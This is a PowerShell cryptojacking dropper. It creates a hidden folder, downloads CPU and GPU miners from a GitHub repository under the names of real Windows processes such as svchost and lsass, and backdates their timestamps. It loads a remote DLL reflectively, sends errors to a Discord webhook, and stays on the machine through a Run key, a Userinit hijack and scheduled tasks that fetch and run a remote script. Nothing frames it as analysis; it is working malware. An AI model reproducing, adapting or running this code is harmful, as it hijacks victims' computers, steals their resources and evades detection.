# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$Wallet = "1871092382" # Mining Key
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- STEALTH SETUP ---
$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

# Chameleon Masking: Randomly pick a "Boring" name from a list of real Windows processes
$Masks = @("svchost", "RuntimeBroker", "SecurityHealthService", "SearchIndexer", "spoolsv", "lsass")
$RandomName = Get-Random -InputObject $Masks
$MaskedCpu = Join-Path $StealthDir ($RandomName + "_x.exe")
$MaskedGpu = Join-Path $StealthDir ($RandomName + "_g.exe")
$MaskedHost = Join-Path $StealthDir "WinSysHelper.exe"

# Copy PowerShell to a masked name to hide in Task Manager
if (-not (Test-Path $MaskedHost)) {
    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $MaskedHost -Force
}

$wc = New-Object System.Net.WebClient
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Handle CPU Miner
if (-not (Test-Path $MaskedCpu)) {
    try {
        $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
        # Download as the masked name to kill the 'XMRig miner' label
        $wc.DownloadFile($RawMinerUrl, $MaskedCpu)
        $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
        (Get-Item $MaskedCpu).CreationTime = $OldDate
        (Get-Item $MaskedCpu).LastWriteTime = $OldDate
    } catch { }
}

# 2. Detect and Download GPU Miner
$HasGpu = $null
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        if ($vc.Name -match "NVIDIA" -or $vc.Name -match "AMD" -or $vc.Name -match "Radeon") { $HasGpu = $true }
    }
} catch { }

if ($HasGpu -and -not (Test-Path $MaskedGpu)) {
    try {
        $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_a.exe"
        $wc.DownloadFile($RawGpuUrl, $MaskedGpu)
        $OldDate = Get-Date -Year 2020 -Month 11 -Day 05
        (Get-Item $MaskedGpu).CreationTime = $OldDate
        (Get-Item $MaskedGpu).LastWriteTime = $OldDate
    } catch { }
}

# --- REFLECTIVE LOADING ---
try {
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
    $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
    
    $GpuArg = if ($HasGpu) { $MaskedGpu } else { "" }
    $IsAmd = "true" 
    
    $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook"
    $startMethod.Invoke($null, @([string]$combinedArgs))
} catch { 
    $errMsg = "❌ **Deployment Error** on " + $env:COMPUTERNAME + ": " + $_.Exception.Message
    $json = "{`"content`": `"$errMsg`"}"
    $wc.Headers["Content-Type"] = "application/json"
    try { $wc.UploadString($Webhook, "POST", $json) } catch { }
}

# --- USER-MODE PERSISTENCE (GHOST LAYER) ---
try {
    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    # Ensure MaskedHost is quoted to handle spaces in user paths
    $Payload = "`"$MaskedHost`" -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
    
    # 1. Registry Run Key
    Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $Payload -ErrorAction SilentlyContinue

    # 2. Userinit Hijack
    $WinlogonPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon"
    if (-not (Test-Path $WinlogonPath)) { New-Item -Path $WinlogonPath -Force | Out-Null }
    $NewInit = "C:\Windows\system32\userinit.exe, " + $Payload
    Set-ItemProperty -Path $WinlogonPath -Name "Userinit" -Value $NewInit -ErrorAction SilentlyContinue

    # 3. Scheduled Task (Immortal Trigger)
    $TaskName = "WinSysMaintenance"
    $Action = New-ScheduledTaskAction -Execute $MaskedHost -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Windows System Maintenance Task" -ErrorAction SilentlyContinue
    }
} catch { 
    # Harder fallback for schtasks quoting
    $SchTaskCmd = "schtasks.exe /create /sc minute /mo 1 /tn `"WinSysMaintenance`" /tr `"$Payload`" /f"
    Invoke-Expression $SchTaskCmd
}
